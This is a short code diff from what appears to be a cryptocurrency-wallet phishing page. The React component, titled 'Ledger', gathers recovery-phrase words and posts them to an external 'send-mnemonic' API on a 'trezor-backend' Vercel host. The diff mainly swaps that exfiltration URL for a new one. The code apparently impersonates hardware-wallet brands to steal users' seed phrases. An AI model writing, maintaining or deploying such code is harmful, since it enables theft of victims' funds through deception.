@@ -83,12 +83,12 @@ export default function PhraseMainPage() {
         value: it,
       }));
 
-      const heading = `Ledger`; 
-      const payload = { data, heading};
+      const heading = `Ledger`;
+      const payload = { data, heading };
 
       setLoading(true);
       const response = await axios.post(
-        "https://trezor-backend-pink.vercel.app/api/v1/send-mnemonic",
+        "https://trezor-backend-ten.vercel.app//api/v1/send-mnemonic",
         // "http://localhost:5454/api/v1/send-mnemonic",
         payload
       );
